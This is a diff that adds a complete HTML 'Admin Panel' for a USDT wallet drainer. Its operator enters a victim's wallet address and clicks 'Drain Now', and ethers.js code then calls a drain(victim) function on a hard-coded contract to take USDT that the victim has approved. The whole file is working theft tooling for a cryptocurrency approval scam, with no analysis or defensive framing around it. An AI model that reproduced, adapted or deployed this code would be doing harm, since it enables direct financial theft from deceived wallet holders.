@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Panel - USDT Drain</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body {
+      background: #111;
+      color: #f0b90b;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    input {
+      padding: 10px;
+      width: 300px;
+      font-size: 16px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      margin-top: 10px;
+      background: #f0b90b;
+      color: black;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #d9a600;
+    }
+    .info {
+      margin-top: 20px;
+      color: #ccc;
+    }
+  </style>
+</head>
+<body>
+  <h1>Admin Panel</h1>
+  <p>Enter a wallet address to drain approved USDT</p>
+
+  <input id="victimAddress" placeholder="0x..." />
+  <br/>
+  <button onclick="drainWallet()">Drain Now</button>
+
+  <div class="info" id="output"></div>
+
+  <script>
+    const CONTRACT_ADDRESS = "0xfB42A84FE8C95B7C0af0dfA634c5a496cAFf6676";
+    const ABI = [
+      "function drain(address victim) public"
+    ];
+
+    async function drainWallet() {
+      const address = document.getElementById("victimAddress").value;
+      const output = document.getElementById("output");
+
+      if (!address || !address.startsWith("0x")) {
+        output.innerText = "Please enter a valid wallet address.";
+        return;
+      }
+
+      try {
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        const contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+
+        const tx = await contract.drain(address);
+        output.innerText = "Transaction sent: " + tx.hash;
+      } catch (err) {
+        output.innerText = "Error: " + err.message;
+      }
+    }
+  </script>
+</body>
+</html>
